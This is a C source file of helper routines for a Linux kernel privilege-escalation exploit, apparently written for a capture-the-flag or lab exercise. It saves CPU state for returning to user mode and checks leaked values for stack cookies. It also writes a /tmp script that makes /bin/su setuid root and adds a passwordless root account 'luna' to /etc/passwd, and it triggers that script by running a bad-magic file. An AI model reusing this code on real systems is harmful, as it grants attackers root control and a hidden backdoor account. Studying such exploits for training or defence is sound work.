#define _GNU_SOURCE
#include "struct.h"
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <stddef.h>


unsigned long kgaslr_unaffected_start = 0;
unsigned long kgaslr_unaffected_end = 0;
#define KALLSYMS_PATH "/proc/kallsyms"
#define MAX_LINE_LEN 256
#define COLOR_YELLOW "\033[0;33m" // Added yellow color
#define COLOR_RESET "\033[0m"

#define tty_size 0x2B8

void spawn_shell() {
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
    } else {
        printf("[!] UID: %d, we root-less :(!\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void dump(unsigned long *leak, unsigned n) {
    for (uint8_t i = 0; i < n; i++) {
        if (i * sizeof(uint64_t) >= n) break;
        uint64_t current_leak = leak[i];
        char leak_str[99];
        sprintf(leak_str, "%#02lx", current_leak);
        printf("\t--> %d: buf + 0x%x\t: %s\n", i, (unsigned int)(sizeof(leak[0]) * i), leak_str);
    }
}

bool is_cookie(const char* str) {
    uint8_t in_len = strlen(str);
    if (in_len < 18) {
        return false;
    }

    char prefix[7] = "0xffff\0";
    char suffix[3] = "00\0";
    return (
        (!strncmp(str, prefix, strlen(prefix) - 1) == 0) &&
        (strncmp(str + in_len - strlen(suffix), suffix, strlen(suffix) - 1) 
        == 0));
}

void set_root_probe(){
    system("echo -e \"#!/bin/sh\nchown root:root /bin/su\nchmod u+s /bin/su\necho 'luna::0:0:root:/:/bin/sh' >> /etc/passwd\n\" > /tmp/x");
    system("chmod +x /tmp/x");
}

void get_root_probe(void){
    system("echo -e '\xFF\xFF\xFF\xFF' > /tmp/pwn" );
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");
    system("su luna; /bin/sh");
    exit(0);
}


